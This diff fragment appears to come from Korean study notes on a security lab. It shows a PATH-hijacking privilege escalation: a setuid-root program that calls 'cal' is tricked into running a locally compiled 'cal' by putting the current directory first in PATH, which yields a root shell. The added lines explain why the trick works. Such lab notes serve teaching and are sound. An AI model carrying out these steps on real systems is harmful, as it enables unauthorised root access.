@@ -199,14 +199,17 @@ $ gcc -o vul vulnerable.c
 $ sudo chown root vul
 $ sudo chmod 4755 vul
 $ vul
-달력 출력
+달력 출력 (usr/bin/cal 실행)
 
 $ gcc -o cal cal.c
 $ export PATH = .:$PATH
+-> 현재 디렉토리 PATH 환경변수에 추가
+$ echo $PATH
+.:/usr/local .... -> 현재 디렉토리가 가장 높은 우선순위의 환경변수가 됨
 $ vul
 #
 #
-쉘(/bin/dash) 실행 -> 공격 성공
+cal을 찾아야하는데 현재 디렉토리가 가장 높은 우선순위의 환경변수이므로 cal.c가 실행이 된다-> root 쉘(/bin/dash) 실행 -> 공격 성공
 $ prid
 ruid = seed euid = root
 ```
